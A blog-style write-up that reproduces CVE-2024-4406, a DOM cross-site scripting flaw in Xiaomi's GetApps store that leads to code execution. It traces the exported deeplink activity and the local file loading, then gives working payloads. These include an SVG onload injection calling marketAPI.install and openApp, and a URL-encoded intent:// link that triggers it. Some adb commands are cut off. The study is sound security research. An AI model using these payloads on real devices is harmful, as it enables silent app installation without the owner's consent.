> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [medium.com](https://medium.com/@happyjester80/xiaomi-13-pro-code-execution-via-getapps-dom-cross-site-scripting-xss-6590cf35fb27)

> بِسْمِ اللَّـهِ الرَّحْمَـٰنِ الرَّحِيمِ

[

![](https://miro.medium.com/v2/da:true/resize:fill:64:64/1*dYffd-9SHPmAV9ACjumD8Q.gif)

](https://medium.com/@happyjester80?source=post_page---byline--6590cf35fb27---------------------------------------)

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1050/0*wL6b3UlTL9oi7HYc.png)

This writeup explores the CVE discovered by [Ken Gannon](https://www.linkedin.com/in/yogehi/) and [Ilyes Beghdadi](https://www.linkedin.com/in/ilyesb4/) at [Pwn2Own 2023](https://www.zerodayinitiative.com/). The goal is to understand their exploitation techniques and the underlying issues, all within a controlled and ethical environment. [Blog](https://www.nccgroup.com/us/research-blog/technical-advisory-xiaomi-13-pro-code-execution-via-getapps-dom-cross-site-scripting-xss/) [Video](https://www.youtube.com/watch?v=B0A8F_Izmj0)

```
Versions affected: 30.4.1.0 and Below

Name  :  GetApps Store Android Application (com.xiaomi.mipicks)

Author: Ken Gannon  of NCC Group , Ilyes Beghdadi of Census Labs

Advisory URL / CVE Identifier:  CVE-2024-4406

```

so as we start in android look at AndroidMainfast.xml there `com.xiaomi.market.ui.JoinActivity`

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1050/1*AD1CKPK7HQ6jCbKb0B92Ow.png)

and it exported also use Deaplinks but there to much here but this one used here to exploit this CVE

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1050/1*wnBRoKEeiU7C8fvjQFHg9Q.png)

for every data of those there Intent to handle it and it looks like this

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1050/1*REdzGIAid96fwxYUBk1ipA.png)

our target called `handleBrowse` so lets try open example.com

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1050/1*bSsN7i6tjjn5o1GWijk4ug.png)

and here we are nothing work lets back to code and see what happen

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1050/1*1zJOjoqPsyd1e3FMwwN9-A.png)

so it checks for host then check for value of URL Parameter in `UriCheckUtilSkt`

![](https://miro.medium.com/v2/resize:fit:956/1*jJXVsUqzeVPJPOXhkHOL0g.png)

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1050/1*NtJIzvOvFxCsjC8NBmnfpg.png)

so in this case it check for host to check if it Valid Host to open or not with `IsUrlMatchLevel` as we can see nothing happened but if the URL Vaild will open one of these Activities `FloatWebActivity` or `CommonWebActivity`

this way lets see what we can do to load this url as we can see here we can load something locally by using `file://` but it check for any `../` so we can change path to get any file from device so which path it use and what we can load from there

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1050/1*jzf1aVOloXHtf66PoDzK5A.png)

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1050/1*8tyqMvSBgh-xBV4eCeIvbQ.png)

so path here come from `WebResDirPath`

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1050/1*um_nL8-rj3cYeh7pqhIrqQ.png)

this one Refer to debug but we are not in debug mode in other hand app get this files from assets

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1050/1*V8JEAI1k4keA6bEDqNqBPg.png)

in this is our point `WEB_RES_DIR_PREFIX`

```
public static final String WEB_RES_DIR_PREFIX = "web-res-";

```

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1050/1*eOz0Ma8vKcvR-xtUvodrFQ.png)

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1050/1*_JIIurha3nUWRLx4C72DOA.png)

lets try to load any file from this dir

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1050/1*AC0EKYyi-yxTur-bjTLU1A.png)

And Here we are `CommonWebActivity` works now lets try to load it by using `intent://`

```
<a rel="noreferrer" href="intent://browse?url=file%3A%2F%2Fdetail.html#Intent;action=android.intent.action.VIEW;scheme=mimarket;end">Intent</a>

```

> Note: Sometimes app not found this files we are load so just clean storage and reopen it again and try.
> 
> Note: this file have 2 version in device first one from assets and another created but as we know from Ken Talk these files are removed Remotely so Xiaomi can Modified this files so first we need to know which folder we are using here so i created file and try to cat it and it worked now i know i’m here in `web-res-2568`

![](https://miro.medium.com/v2/resize:fit:830/1*y3dqassSlobRJMncsz1BGQ.png)

in `Web-res-xxxx` there HTML files and Js files every file have another with same name `zone.html` `zone.js`

Most of the JavaScript files contained an integrated function to filter potentially dangerous characters.

This is because some HTML files were required to take user input (via URL GET parameters) and fill out the HTML content based on the user input.

in Our Case they are use These Files

`integral-dialog-page.html integral-dialog-page-chunk.js`

```
<!doctype html>
<html>
  <head>
    <meta charset="utf-8" />
    <title>Mi Apps</title>
    <meta
      
      content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-sca
    />
    <link href="commons.chunk.css" rel="stylesheet" />
    <link href="integral-dialog-page.chunk.css" rel="stylesheet" />
  </head>
  <body>
    <script src="manifest.js"></script>
    <script src="corejs.chunk.js"></script>
    <script src="i18n.chunk.js"></script>
    <script src="zepto.chunk.js"></script>
    <script src="commons.chunk.js"></script>
    <script src="integral-checkin-page~integral-dialog-page~integral-special-task.chunk.js"></script>
    <script src="integral-dialog-page.chunk.js"></script>
  </body>
</html>

```

Let’s see how this can happened

Get Happy Jester’s stories in your inbox
----------------------------------------

Join Medium for free to get updates from this writer.

Here we can see we have Parameter called `integralinfo` so lets see what Values are it get

![](https://miro.medium.com/v2/resize:fit:809/1*VsBMqo1gWjLtzPuil8v6nA.png)

so what have we done so far we found the Files we can load and we take `integral-dialog-page.html` and found it take GET Parameter `integralinfo` so we use this Parameter to try to get DOM XSS by Injecting in `Type`

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1050/1*0YQm8fo598GI59lciRNadw.png)

```
{"title":"Reproduce Proof of concept","type":"Reproduce Proof of concept","subtitle":"By HappyJester","tips":"Test","btnTips":"Test"}

```

Author was using `chrome://inspect` and Debug the calls as he shows in DEFCON Talk and there was XSS filters found in Logs but I can’t see it now so u can read his Slides from DEFCON to see Full Bypass

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1050/1*DWDg-Qg4ankhjwpvj-7IxQ.png)

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1050/1*Y6gsCuNAfNLqz-9_esfxPQ.png)XSS Test

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1050/1*KGpnp978eTu1U6OiRAmtqw.png)Sanitization Prove

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1050/1*B99CYG0jKNQGrkwfS6EOQQ.png)

XSS Filter Bypass
-----------------

![](https://miro.medium.com/v2/resize:fit:926/1*mgsUdEz8IommMsY6z7_b2w.png)

Note Again: I did add this files manual from assets because this files updated by Xiaomi Remote I guess so all versions not working after we add them now it works

```
 adb shell am start -a android.intent.action.VIEW -d 'mimarket:

```

XSS POC
-------

```
 adb shell am start -a android.intent.action.VIEW -d 'mimarket:

```

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:821/1*jGBvnlozGHkiBdhMVD8ykA.png)

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:852/1*so-X7MWEAOk_eW9dlbibkA.png)

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1665/1*S9QkvmNNmovkqLvFfIXbDQ.png)

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:830/1*Za4Vin8W5JQU2hmDshunVg.png)

First we need to retrieve info about app we want to install so I used [medusa](https://github.com/Ch0pin/medusa) to get The app info by intercept all URI and Intent calls

```
{"title":"Reproduce Proof of concept","type":"yaytypeyay\u0022\u003e\u003csvg onload\u003d\u0022javascript\u003aalert(marketAPI.install({'title':'Discord','pName':'com.discord','appId':'472727','callBack':'marketAsyncCb.installCb'}))\u0022\u003e","subtitle":"By HappyJester","tips":"Test","btnTips":"Button"}

```

```
adb shell am start -a android.intent.action.VIEW -d 'mimarket:

```

```
<h1>
<a rel="noreferrer" href="intent://browse?url=file%3A%2F%2Fintegral-dialog-page.html?integralInfo=%7B%22%74%69%74%6C%65%22%3A%22%52%65%70%72%6F%64%75%63%65%20%50%72%6F%6F%66%20%6F%66%20%63%6F%6E%63%65%70%74%22%2C%22%74%79%70%65%22%3A%22%79%61%79%74%79%70%65%79%61%79%5C%75%30%30%32%32%5C%75%30%30%33%65%5C%75%30%30%33%63%73%76%67%20%6F%6E%6C%6F%61%64%5C%75%30%30%33%64%5C%75%30%30%32%32%6A%61%76%61%73%63%72%69%70%74%5C%75%30%30%33%61%61%6C%65%72%74%28%6D%61%72%6B%65%74%41%50%49%2E%69%6E%73%74%61%6C%6C%28%7B%27%74%69%74%6C%65%27%3A%27%44%69%73%63%6F%72%64%27%2C%27%70%4E%61%6D%65%27%3A%27%63%6F%6D%2E%64%69%73%63%6F%72%64%27%2C%27%61%70%70%49%64%27%3A%27%34%37%32%37%32%37%27%2C%27%63%61%6C%6C%42%61%63%6B%27%3A%27%6D%61%72%6B%65%74%41%73%79%6E%63%43%62%2E%69%6E%73%74%61%6C%6C%43%62%27%7D%29%29%5C%75%30%30%32%32%5C%75%30%30%33%65%22%2C%22%73%75%62%74%69%74%6C%65%22%3A%22%42%79%20%48%61%70%70%79%4A%65%73%74%65%72%22%2C%22%74%69%70%73%22%3A%22%54%65%73%74%22%2C%22%62%74%6E%54%69%70%73%22%3A%22%42%75%74%74%6F%6E%22%7D#Intent;scheme=mimarket;package=com.xiaomi.mipicks;end">
        GO</a>
</h1>

```

Open any App The device
-----------------------

```
{"title":"Reproduce Proof of concept","type":"yaytypeyay\u0022\u003e\u003csvg onload\u003d\u0022javascript\u003aalert(marketAPI.openApp({'pName':'com.android.documentsui'}))\u0022\u003e","subtitle":"By HappyJester","tips":"Test","btnTips":"Button"}

```

```
 adb shell am start -a android.intent.action.VIEW -d 'mimarket:

```